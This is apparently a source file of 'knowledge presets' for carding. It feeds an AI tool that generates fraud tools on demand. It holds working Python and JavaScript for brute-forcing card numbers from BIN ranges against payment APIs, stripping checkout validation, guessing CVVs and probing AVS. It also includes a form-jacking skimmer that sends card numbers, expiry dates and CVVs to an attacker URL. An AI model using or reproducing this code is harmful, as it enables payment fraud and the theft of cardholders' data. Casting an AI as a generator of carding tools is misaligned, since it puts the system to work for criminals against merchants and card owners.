// Carding Techniques Knowledge Presets
// This file contains **knowledge presets** for carding techniques.
// The AI uses this to **generate tools dynamically** when needed.

export const CARDING_TECHNIQUES = {
  bin_attack: {
    description: "Generate and test card numbers using known BIN ranges",
    steps: [
      "Identify target BIN ranges (e.g., Vanilla Visa BINs)",
      "Generate valid card numbers using Luhn algorithm",
      "Test generated numbers against target API",
      "Check for valid responses (balance, success messages)",
    ],
    toolsNeeded: ["BIN list", "Luhn algorithm", "HTTP request automation"],
    exampleCode: `
import requests
from luhn import luhn_checksum

def generate_card(bin, length=16):
    prefix = str(bin)
    for _ in range(length - len(prefix) - 1):
        prefix += '0'
    for i in range(10):
        card = prefix + str(i)
        card += str(luhn_checksum(card))
        yield card

def test_bin(bin, api_url):
    for card in generate_card(bin):
        try:
            response = requests.post(api_url, json={'card_number': card}, timeout=5)
            if 'valid' in response.text.lower():
                print(f"[+] Valid card: {card}")
                return card
        except:
            pass
    return None
`,
  },
  
  cc_validation_bypass: {
    description: "Bypass client-side credit card validation",
    methods: [
      "JavaScript Injection: Override validation functions",
      "API Manipulation: Send raw requests with fake CC data",
      "Format Tricks: Use spaces/special chars to bypass regex checks",
      "Field Tampering: Remove or modify validation attributes",
    ],
    toolsNeeded: ["Custom JS payloads", "Burp Suite", "cURL"],
    exampleCode: `
// JavaScript to bypass CC validation
function bypassCCValidation() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        const ccInput = form.querySelector('input[name*="card"]');
        if (ccInput) {
            ccInput.removeAttribute('pattern');
            ccInput.removeAttribute('required');
            ccInput.oninvalid = () => {};
        }
    });
}
bypassCCValidation();
`,
  },
  
  cvv_bypass: {
    description: "Bypass CVV requirements for card transactions",
    methods: [
      "Default CVV: Try 000, 123, 111, 001, etc.",
      "API Tampering: Remove CVV from API requests",
      "Stored Cards: Use cards with saved CVV (if possible)",
      "Weak Validation: Some systems accept any 3-4 digit number",
    ],
    toolsNeeded: ["Proxy (Burp, Mitm)", "Custom scripts"],
    exampleCode: `
import requests

def test_cvv_bypass(card_number, api_url):
    cvvs = ['000', '123', '111', '001', '999', '456']
    for cvv in cvvs:
        try:
            response = requests.post(api_url, json={
                'card_number': card_number,
                'cvv': cvv,
                'expiry': '12/25'
            }, timeout=5)
            if response.status_code == 200:
                print(f"[+] CVV bypass successful with: {cvv}")
                return cvv
        except:
            pass
    return None
`,
  },
  
  skimmer: {
    description: "Develop malicious JavaScript to steal card data",
    types: [
      "Form Jacking: Capture form submissions",
      "Fake Checkout: Overlay fake payment form",
      "Keylogger: Record keystrokes on payment pages",
      "Data Exfiltration: Send stolen data to attacker server",
    ],
    toolsNeeded: ["Malicious JS", "Obfuscation", "Exfiltration server"],
    exampleCode: `
// Basic card skimmer
(function() {
    const exfilURL = 'https://attacker.com/steal';
    const fields = ['cardnumber', 'ccnum', 'card_number', 'pan', 'expiry', 'expdate', 'cvv', 'cvc'];
    
    function captureData() {
        const data = {};
        fields.forEach(field => {
            const input = document.querySelector(\`input[name*=\${field}], input[id*=\${field}]\`);
            if (input) data[field] = input.value;
        });
        if (Object.keys(data).length > 0) {
            fetch(exfilURL, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' }
            });
        }
    }
    
    document.addEventListener('input', captureData);
    document.addEventListener('submit', captureData);
    setInterval(captureData, 5000);
})();
`,
  },
  
  avs_bypass: {
    description: "Bypass Address Verification System (AVS) checks",
    methods: [
      "Use matching billing/shipping addresses",
      "Test with partial address matches",
      "Exploit AVS misconfigurations (some merchants ignore AVS)",
      "Use known valid address databases",
    ],
    toolsNeeded: ["Address databases", "API testing tools"],
    exampleCode: `
import requests

def test_avs_bypass(card_number, api_url):
    # Common address combinations that might bypass AVS
    addresses = [
        {'street': '123 Main St', 'city': 'New York', 'zip': '10001'},
        {'street': '456 Oak Ave', 'city': 'Los Angeles', 'zip': '90001'},
        {'street': '789 Pine Rd', 'city': 'Chicago', 'zip': '60601'},
    ]
    
    for addr in addresses:
        try:
            response = requests.post(api_url, json={
                'card_number': card_number,
                'billing_address': addr
            }, timeout=5)
            if response.status_code == 200:
                print(f"[+] AVS bypass successful with: {addr}")
                return addr
        except:
            pass
    return None
`,
  },
};
